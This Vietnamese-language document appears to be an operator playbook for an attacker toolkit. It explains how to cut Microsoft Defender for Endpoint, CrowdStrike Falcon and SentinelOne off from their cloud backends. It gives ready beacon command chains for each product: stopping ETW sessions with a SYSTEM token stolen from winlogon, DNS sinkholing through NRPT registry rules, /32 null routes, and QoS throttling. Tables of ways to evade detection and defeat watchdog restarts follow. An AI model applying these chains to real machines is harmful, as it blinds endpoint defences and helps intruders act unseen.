# Phân Tích Chain Block EDR

> Bản tiếng Anh: [edr-block-chain-analysis.md](edr-block-chain-analysis.md)

## Tổng Quan

EDR hiện đại giao tiếp với cloud backend qua nhiều kênh độc lập. Chặn một kênh duy nhất thường không đủ — hầu hết agent đều có logic fallback, tự động thử kênh khác khi kênh chính bị lỗi. Tài liệu này map toàn bộ các kênh giao tiếp, xác định từng kỹ thuật chặn tương ứng với từng tầng, và cung cấp ba chain đầy đủ cho ba EDR thương mại phổ biến nhất.

---

## 1. Kiến Trúc Giao Tiếp của EDR

```
  ┌──────────────────────────────────────────────────────────────────────┐
  │                         Tiến Trình EDR Agent                         │
  │  (MsSense.exe / CSFalconService.exe / SentinelAgent.exe)            │
  │                                                                      │
  │  ┌────────────┐   ┌───────────────┐   ┌──────────────────────────┐  │
  │  │ Telemetry  │   │  ETW Consumer │   │  Cập nhật Policy/Config  │  │
  │  │ Uploader   │   │  (đọc ETW     │   │  (tải rule phát hiện,    │  │
  │  │ (HTTPS/    │   │   sessions)   │   │   signature từ cloud)    │  │
  │  │  gRPC)     │   └───────┬───────┘   └──────────┬───────────────┘  │
  │  └─────┬──────┘           │                      │                  │
  └────────┼──────────────────┼──────────────────────┼──────────────────┘
           │                  │ (kernel events)       │
           │         ┌────────▼────────┐              │
           │         │  ETW Subsystem  │              │
           │         │  (NTOSKRNL)     │              │
           │         │  Sessions:      │              │
           │         │  - Sense        │              │
           │         │  - ETW-TI       │              │
           │         │  - Falcon       │              │
           │         └─────────────────┘              │
           │                                          │
           ▼                                          ▼
  ┌─────────────────────────────────────────────────────────────────────┐
  │                     Windows Network Stack                           │
  │                                                                     │
  │  ┌──────────────┐   ┌──────────────┐   ┌───────────────────────┐   │
  │  │  DNS Client  │   │  TCP/IP      │   │  TLS / HTTP.sys       │   │
  │  │  (dnscache)  │   │  (tcpip.sys) │   │  (schannel.dll)       │   │
  │  │              │   │              │   └───────────────────────┘   │
  │  │  1. hosts    │   │  Routing     │                               │
  │  │  2. cache    │   │  table       │                               │
  │  │  3. NRPT  ◄──┼───┼─── RULE     │                               │
  │  │  4. DNS srv  │   │  CỦA TA ──► │                               │
  │  └──────────────┘   │  /32 routes │                               │
  │                     └──────────────┘                               │
  │                                                                     │
  │  ┌──────────────────────────────────────────────────────────────┐  │
  │  │  QoS / pacer.sys                                             │  │
  │  │  Giới hạn băng thông theo process (edrchoker — BOF hiện có) │  │
  │  └──────────────────────────────────────────────────────────────┘  │
  └─────────────────────────────────────────────────────────────────────┘
           │
           ▼
  ┌─────────────────────────────────────────────────────────────────────┐
  │                     Card Mạng Vật Lý                                │
  │                     (packet chỉ ra ngoài khi tất cả                 │
  │                      các tầng trên đều cho phép)                    │
  └─────────────────────────────────────────────────────────────────────┘
           │
           ▼
  ┌─────────────────────────────────────────────────────────────────────┐
  │                     EDR Cloud Backend                               │
  │  MDE:    *.security.microsoft.com  *.wdcp.microsoft.com            │
  │  CS:     *.falcon.crowdstrike.com  *.cloudsink.net                 │
  │  S1:     *.sentinelone.net         *.pax.sentinelone.net           │
  └─────────────────────────────────────────────────────────────────────┘
```

---

## 2. Phân Tích Tầng — Kỹ Thuật Nào Chặn Tầng Nào

```
  KÊNH TRUYỀN THÔNG          BỊ CHẶN BỞI         CƠ CHẾ
  ─────────────────────────────────────────────────────────────────────
  Phân giải DNS               nrpt_sinkhole       Rule NRPT chuyển hướng
  (domain -> IP lookup)                           về 127.0.0.2 / SERVFAIL

  Kết nối TCP đến IP          null_route          Route /32 ép traffic
  hardcoded (không dùng DNS)                      vào loopback →
                                                  RST ngay lập tức

  Thông lượng mạng            edrchoker           QoS pacer.sys cap:
  (sau khi kết nối)                               8 bps — TLS handshake
                                                  mất ~6000 giây

  Sự kiện kernel ETW          etw_tamper          ControlTraceW STOP:
  (behavioral telemetry)                          session bị xóa,
                                                  consumer nhận NOTFOUND

  Chặn tầng WFP               (BOF riêng)         xem 01_wfp_block.c
  (deep packet filter)
  ─────────────────────────────────────────────────────────────────────
```

### Tại Sao Từng Kỹ Thuật Hoạt Động ở Tầng OS

#### nrpt_sinkhole — Inject Rule NRPT vào Registry

Windows DNS Client (dịch vụ `dnscache`, chạy trong `svchost.exe -k NetworkService`) xử lý toàn bộ DNS query trong user-space TRƯỚC KHI forward lên kernel resolver. Mỗi lần có query, nó duyệt danh sách NRPT policy ở:

```
HKLM\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient\DnsPolicyConfig\
```

Mỗi subkey là một rule. Dịch vụ `dnscache` parse field `Name` (kiểu `REG_MULTI_SZ`) như một pattern namespace và so sánh với FQDN của query. Nếu khớp, giá trị `DNSServers` sẽ ghi đè DNS server được cấu hình trên adapter cho query đó.

Khi đặt `DNSServers = "127.0.0.2"`, DNS query sẽ được gửi tới `127.0.0.2:53` qua UDP. Không có service nào bind vào `127.0.0.2:53`, nên:
- UDP: không có response → query timeout → trả SERVFAIL cho application
- Application nhận `WSAHOST_NOT_FOUND` hoặc lỗi socket tương tự

EDR agent không được thông báo khi bảng NRPT bị sửa đổi. Thay đổi có hiệu lực ngay sau khi gọi `DnsFlushResolverCache()` (BOF tự gọi tự động) hoặc khi TTL của các câu trả lời đã cache hết hạn.

**Call path nội bộ:**
```
Application: getaddrinfo("endpoint.microsoft.com", ...)
  -> DnsQuery (dnsapi.dll)
  -> RPC tới dịch vụ dnscache
  -> dnscache: check bảng NRPT
  -> tìm thấy rule khớp -> chuyển hướng tới 127.0.0.2:53
  -> UDP query tới 127.0.0.2:53 -> ETIMEDOUT
  -> trả WSANO_DATA / SERVFAIL về application
```

**Ví dụ thực tế với MDE:**
Khi `MsSense.exe` cần gửi telemetry:
1. Gọi `getaddrinfo("endpoint.microsoft.com")`
2. `dnsapi.dll` → RPC → `dnscache`
3. `dnscache` check NRPT: thấy rule `edrchoker_A3F2B819` khớp với `*.endpoint.microsoft.com`
4. Gửi UDP query tới `127.0.0.2:53` → timeout sau ~5 giây
5. `getaddrinfo` trả về lỗi → `MsSense.exe` không kết nối được

#### null_route — Blackhole /32 trong Routing Table

Bảng forwarding IPv4 (xem qua `route print` hoặc API `GetIpForwardTable`) được quản lý bởi `tcpip.sys`. Khi kernel route một TCP SYN packet đi ra ngoài, nó thực hiện **Longest-Prefix-Match (LPM)** lookup. Route `/32` với mask `0xFFFFFFFF` là entry specific nhất có thể — luôn **thắng** bất kỳ route nào khác đến IP đó (subnet `/24`, default gateway `/0`).

Bằng cách đặt next-hop của `/32` là `127.0.0.1` trên loopback interface:
1. Kernel route packet SYN vào loopback adapter
2. Loopback driver giao packet cho TCP stack nội bộ
3. TCP stack tìm socket bind vào destination IP (ví dụ `52.183.0.1`)
4. Không có socket nào bind vào IP đó trên loopback
5. TCP stack gửi RST về socket đang connect
6. `connect()` trả về `WSAECONNREFUSED` ngay lập tức
7. **Không một packet nào thoát ra NIC vật lý**

Đây là enforcement ở tầng OS — không cần WFP rule, không cần firewall userspace. `tcpip.sys` đưa ra quyết định routing TRƯỚC KHI packet được trao cho NIC driver.

**Tại sao kỹ thuật này cover được hardcoded IP:**
Một số EDR agent biên dịch IP cloud vào trong binary (hoặc cache vào disk từ lần lookup DNS trước) và dùng trực tiếp không qua DNS. NRPT sinkhole không có tác dụng với loại kết nối này. Route `/32` chặn chúng bất kể IP được lấy từ đâu.

**Ví dụ thực tế:**
```
Trước khi add route:
  MsSense.exe → connect(52.183.20.1:443) → route lookup: "dùng default gateway" → packet ra NIC → kết nối thành công

Sau khi add route:
  null_route 52.183.20.1  →  thêm vào routing table: 52.183.20.1/32 via 127.0.0.1
  MsSense.exe → connect(52.183.20.1:443) → route lookup: khớp /32 → loopback
  → TCP stack: không có server nào bind 52.183.20.1 → gửi RST
  → connect() trả WSAECONNREFUSED trong <1ms
  → không có byte nào ra NIC
```

#### etw_tamper — Dừng ETW Session

ETW (Event Tracing for Windows) là kênh telemetry kernel chính của Windows. Kiến trúc:

```
  Kernel provider (ví dụ: Microsoft-Windows-Kernel-Process)
    -> EtwWrite() syscall (NtTraceEvent)
    -> ETW logger thread trong ntoskrnl
    -> ghi event vào session buffer
    -> session buffer flush tới consumer

  Consumer (EDR)
    -> OpenTrace() + ProcessTrace() trên named session
    -> đọc event theo thời gian thực
```

Khi `ControlTraceW(0, sessionName, props, EVENT_TRACE_CONTROL_STOP)` được gọi:
1. ETW subsystem đánh dấu session là "đang dừng"
2. Nội dung buffer còn lại được flush cho consumer (lần cuối)
3. Session handle bị hủy
4. Lời gọi `ProcessTrace()` của consumer trả về `ERROR_WMI_INSTANCE_NOT_FOUND` (0x80071069)
5. Event processing loop của EDR thoát ra hoặc throw lỗi
6. Tất cả kernel event tương lai lẽ ra đi vào session này đều **bị drop silently** — provider không nhận bất kỳ lỗi nào

**Tại sao cần SYSTEM token:**
ETW session do system service tạo ra có security descriptor đặt `NT AUTHORITY\SYSTEM` làm owner. Gọi `ControlTrace` trên session không phải của mình đòi hỏi privilege ngang bằng owner. Một token Administrator (kể cả elevated, có `SeSecurityPrivilege`) vẫn bị từ chối.

**Luồng steal SYSTEM token từ winlogon:**
```
CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS)
  -> tìm winlogon.exe (luôn chạy SYSTEM, luôn có mặt trên session tương tác)
  -> OpenProcess(PROCESS_QUERY_INFORMATION, winlogon_pid)
  -> OpenProcessToken(hProc, TOKEN_DUPLICATE)
  -> DuplicateToken(hToken, SecurityImpersonation)
  -> SetThreadToken(NULL, hDup)   <- thread hiện tại đang impersonate SYSTEM
  -> ControlTraceW(...)           <- gọi với quyền SYSTEM
  -> SetThreadToken(NULL, NULL)   <- revert về token gốc
```

**Những gì EDR mất đi:**
- Session `Microsoft-Windows-Threat-Intelligence` (ETW-TI): không còn event tạo process, event kết nối mạng, event cấp phát memory. Đây là nguồn tín hiệu behavioral chính của MDE.
- `CrowdStrike-Falcon-Sensor`: không còn process event, file system event. Kernel sensor telemetry của CS bị cắt hoàn toàn.
- `SentinelOne-Sensor`: tương tự, Deep Visibility telemetry của S1 bị ngắt.

#### edrchoker — Bóp Băng Thông QoS (BOF hiện có)

Dù DNS và routing chưa bị chặn hoàn toàn (ví dụ EDR kết nối lại qua IP mới), `pacer.sys` vẫn enforce giới hạn băng thông 8 bps theo process. Ở mức 8 bps:
- TLS 1.3 ClientHello (~320 byte) mất 320 giây để truyền
- Một batch telemetry đầy đủ (thường 1–100 KB) mất 1.000–100.000 giây

Thực tế là zero throughput với mọi chức năng EDR thực tế.

---

## 3. Chain Thực Chiến

### Chain A: Microsoft Defender for Endpoint (MDE)

**Tên process EDR:** `MsSense.exe`, `MsSenseS.exe`, `SenseNdr.exe`  
**Domain cloud:** `*.endpoint.microsoft.com`, `*.wdcp.microsoft.com`,
  `*.ods.opinsights.azure.com`, `*.security.microsoft.com`,
  `*.events.data.microsoft.com`  
**ETW sessions:** `Microsoft-Windows-Sense`,
  `Microsoft-Windows-Threat-Intelligence`  
**Dải IP cloud thường gặp:** 20.190.x.x, 52.183.x.x, 13.89.x.x (Azure)

**Các lệnh beacon theo từng bước:**

```
# Bước 1: Dừng ETW trước — làm mù behavioral detection ngay lập tức
etw_tamper mde

# Bước 2: Sinkhole toàn bộ domain DNS của MDE
nrpt_sinkhole *.endpoint.microsoft.com;*.wdcp.microsoft.com;*.ods.opinsights.azure.com;*.security.microsoft.com;*.events.data.microsoft.com

# Bước 3: Blackhole các IP range MDE đã biết (cover hardcoded IP)
#   (lấy IP hiện tại: netstat -anob | findstr MsSense)
null_route 20.190.128.1;20.190.129.1;52.183.20.1;13.89.176.1

# Bước 4: Giới hạn QoS làm failsafe (cover IP/domain ta bỏ sót)
edrchoker MsSense.exe;MsSenseS.exe;SenseNdr.exe
```

**Kết quả đạt được:**
- ETW session bị tear down → MDE không nhận được kernel behavioral event
- DNS bị sinkhole → domain lookup thất bại với SERVFAIL
- Route /32 → kết nối tới hardcoded IP nhận RST ngay
- QoS cap → mọi kết nối thoát qua đều bị throttle về 8 bps

**Hành vi MDE dự kiến sau chain:**
Process MDE vẫn chạy nhưng vào trạng thái "disconnected". Quét on-disk tại chỗ vẫn hoạt động. Behavioral detection (real-time protection qua ETW-TI) bị vô hiệu hóa. Cloud sandbox detonation, cloud ML inference, và upload telemetry đều thất bại.

---

### Chain B: CrowdStrike Falcon

**Tên process EDR:** `CSFalconService.exe`, `CSFalconContainer.exe`,
  `falconhost.exe` (phiên bản cũ), `CsFalconD.exe`  
**Domain cloud:** `*.falcon.crowdstrike.com`, `*.cloudsink.net`,
  `ts01-*.cloudsink.net` (telemetry sinks), `*.crowdstrike.com`  
**ETW sessions:** `CrowdStrike-Falcon-Sensor`,
  `CrowdStrike-Falcon-Operational`  
**Dải IP cloud thường gặp:** 35.232.x.x, 34.102.x.x (GCP)

**Các lệnh beacon theo từng bước:**

```
# Bước 1: Dừng CrowdStrike ETW sessions
etw_tamper crowdstrike

# Bước 2: Sinkhole CrowdStrike DNS domains
nrpt_sinkhole *.falcon.crowdstrike.com;*.cloudsink.net;*.crowdstrike.com

# Bước 3: Blackhole IP cloud CrowdStrike
#   (lấy IP hiện tại: Resolve-DnsName ts01-b.cloudsink.net)
null_route 35.232.0.1;34.102.200.1;34.102.201.1

# Bước 4: QoS throttle làm failsafe
edrchoker CSFalconService.exe;CSFalconContainer.exe
```

**Hành vi CrowdStrike dự kiến sau chain:**
Falcon sensor vào "reduced functionality mode" — heuristic phòng ngừa local vẫn chạy nhưng real-time telemetry upload thất bại. Falcon console hiển thị sensor là "offline" trong vòng ~5 phút. Các cập nhật detection policy từ cloud không đến được sensor.

---

### Chain C: SentinelOne

**Tên process EDR:** `SentinelAgent.exe`, `SentinelServiceHost.exe`,
  `SentinelStaticEngine.exe`, `SentinelHelperService.exe`  
**Domain cloud:** `*.sentinelone.net`, `*.pax.sentinelone.net`,
  `usea1.pax.sentinelone.net`, `eap-prod-*.sentinelone.net`  
**ETW sessions:** `SentinelOne-Sensor`, `SentinelOne-Operational`  
**Dải IP cloud thường gặp:** 54.x.x.x, 3.x.x.x (AWS us-east-1)

**Các lệnh beacon theo từng bước:**

```
# Bước 1: Dừng SentinelOne ETW sessions
etw_tamper sentinelone

# Bước 2: Sinkhole SentinelOne DNS domains
nrpt_sinkhole *.sentinelone.net;*.pax.sentinelone.net

# Bước 3: Blackhole IP cloud SentinelOne
#   (lấy IP hiện tại: Resolve-DnsName usea1.pax.sentinelone.net)
null_route 54.80.0.1;3.213.0.1;3.214.0.1

# Bước 4: QoS throttle làm failsafe
edrchoker SentinelAgent.exe;SentinelServiceHost.exe
```

**Hành vi SentinelOne dự kiến sau chain:**
Agent SentinelOne vào "disconnected mode". Phân tích tĩnh tại chỗ (StaticAI) và behavioral AI (BEHAVIOURAL_AI) vẫn chạy nhưng không upload được dữ liệu. Deep Visibility telemetry (nguồn forensics chính) dừng hẳn. Console hiển thị agent là "Disconnected" và policy sync thất bại.

---

## 4. Điểm Yếu và Rủi Ro Còn Lại

### Điểm Yếu của nrpt_sinkhole

| Rủi Ro | Mô Tả | Cách Khắc Phục |
|--------|--------|----------------|
| DNS cache còn lại | Nếu MDE đã resolve domain trước khi install sinkhole, câu trả lời cache vẫn còn cho đến khi TTL hết hạn. BOF tự gọi `DnsFlushResolverCache()`. | Chạy `ipconfig /flushdns` thủ công làm backup. |
| Hardcoded IP | Một số EDR cache IP cloud ra disk (file config hoặc registry) và bypass DNS. NRPT không có tác dụng. | Dùng `null_route` song song. |
| DoH (DNS over HTTPS) | Nếu EDR dùng DoH resolver riêng, NRPT bị bypass hoàn toàn. DoH đi thẳng qua HTTPS port 443. | Dùng `null_route` block IP của DoH endpoint, hoặc `edrchoker` throttle process. |
| IPv6 | NRPT rule áp dụng cho DNS IPv4 (bản ghi A). AAAA lookup và kết nối IPv6 không bị ảnh hưởng. | Tắt IPv6 trên adapter hoặc thêm rule IPv6 riêng. |
| Phát hiện registry | Một số EDR theo dõi HKLM policy key để phát hiện thay đổi. | Áp dụng ETW tamper trước để giảm khả năng giám sát của EDR. |

### Điểm Yếu của null_route

| Rủi Ro | Mô Tả | Cách Khắc Phục |
|--------|--------|----------------|
| IP rotation | Cloud backend dùng Anycast hoặc thay đổi IP thường xuyên. Route /32 cho IP hôm nay sẽ vô dụng vào ngày mai. | Kết hợp với NRPT để IP mới (từ DNS) không lấy được. |
| IPv6 routes | `MIB_IPFORWARDROW` chỉ cho IPv4. IPv6 route cần `CreateIpForwardEntry2` với `MIB_IPFORWARD_ROW2`. | Thêm null route IPv6 riêng, hoặc tắt IPv6. |
| Persistence sau reboot | Route do `CreateIpForwardEntry` tạo không phải lúc nào cũng tồn tại sau reboot (tùy `dwForwardProto`). Route NETMGMT (proto=3) thường bị xóa khi reboot. | Cài lại route sau reboot, hoặc dùng persistent route store. |
| Phát hiện route | `route print` hiển thị các entry /32. EDR đủ paranoid có thể tự kiểm tra routing table của mình. | ETW tamper giảm khả năng giám sát trước khi add route. |

### Điểm Yếu của etw_tamper

| Rủi Ro | Mô Tả | Cách Khắc Phục |
|--------|--------|----------------|
| Session restart | EDR service có thể phát hiện mất session và tự restart ETW session (nhiều agent có watchdog thread cho việc này). | Chạy lại `etw_tamper` định kỳ, hoặc dùng `edrchoker` để làm chậm watchdog loop của EDR. |
| Telemetry kênh khác | Một số EDR (đặc biệt MDE) còn dùng `PsSetCreateProcessNotifyRoutine` kernel callback, minifilter callback, và object callback độc lập với ETW. Các kênh này không bị ảnh hưởng bởi ETW session teardown. | Kết hợp với edrchoker throttle để upload telemetry không thể thực hiện dù event local vẫn được capture. |
| Truy cập WinLogon | Nếu Beacon chạy với token bị giới hạn (low-integrity hoặc sandboxed), `OpenProcess(winlogon)` có thể thất bại. | Đảm bảo Beacon chạy trong process elevated high-integrity. |
| Alert EDR console | Nhiều EDR vendor phát hiện mất ETW-TI session từ phía server (họ thấy telemetry dừng đột ngột) và tạo alert "sensor disconnected". | Đây là trade-off: phát hiện local bị dừng, nhưng SOC có thể được cảnh báo. Trong operation thời gian nhạy cảm, chấp nhận rủi ro này. |
| Tên session không rõ | Vendor có thể dùng tên session không có tài liệu, không có trong danh sách mặc định. | Dùng `logman query` hoặc `etwtrace list` để enumerate session đang chạy trước, sau đó truyền tên tùy chỉnh vào BOF. |

### Điểm Yếu của edrchoker (BOF hiện có, ghi lại để hoàn chỉnh)

| Rủi Ro | Mô Tả | Cách Khắc Phục |
|--------|--------|----------------|
| Bypass QoS | Một số process bypass QoS bằng cách dùng raw socket hoặc gọi ở priority cao. | Không khả thi với EDR agent chuẩn dùng WinHTTP / WinSock. |
| Phát hiện WMI watchdog | WMI permanent subscription là cơ chế persistence được biết đến rộng rãi và được nhiều EDR giám sát. | Áp dụng ETW tamper trước khi install watchdog. |
| Phạm vi policy | `AppPathNameMatchCondition` khớp theo tên process (không phải đường dẫn đầy đủ). Process đổi tên thành `MsSense.exe` cũng bị throttle. | Chấp nhận side effect này hoặc thêm path matching nếu có. |

### Tóm Tắt Rủi Ro Chain Kết Hợp

```
  KỸ THUẬT          RỦI RO PHÁT HIỆN   HIỆU QUẢ       KHẢ NĂNG PHỤC HỒI
  ──────────────────────────────────────────────────────────────────────
  nrpt_sinkhole      THẤP               CAO             CAO (xóa key)
                     (ghi registry,     (chặn DNS)      (xóa rule,
                     không có           
                     process event)                      flush cache)

  null_route         THẤP               CAO             CAO (xóa route)
                     (thay đổi routing, (chặn IP)
                     không có
                     process event)

  etw_tamper         TRUNG BÌNH         CAO             THẤP (session mất,
                     (EDR có thể thấy   (không có        EDR phải tự restart
                     session dừng;      kernel event)    session)
                     SOC khả năng
                     nhận alert)

  edrchoker          TRUNG BÌNH         CAO             CAO (xóa WMI
                     (WMI subscription  (0 throughput)   subscription)
                     có thể bị phát
                     hiện)
  ──────────────────────────────────────────────────────────────────────
```

**Thứ tự thực hiện được khuyến nghị:**
1. `etw_tamper` trước — giảm khả năng giám sát local của EDR trước khi làm các bước khác
2. `nrpt_sinkhole` — chặn DNS trước khi EDR kịp tạo kết nối mới
3. `null_route` — chặn hardcoded IP
4. `edrchoker` — failsafe throughput cap cho các kết nối lọt qua

Thứ tự này thu hẹp tối đa khoảng thời gian mà EDR đang bị suy yếu một phần nhưng vẫn còn khả năng phát hiện và báo cáo hoạt động suy yếu đó.
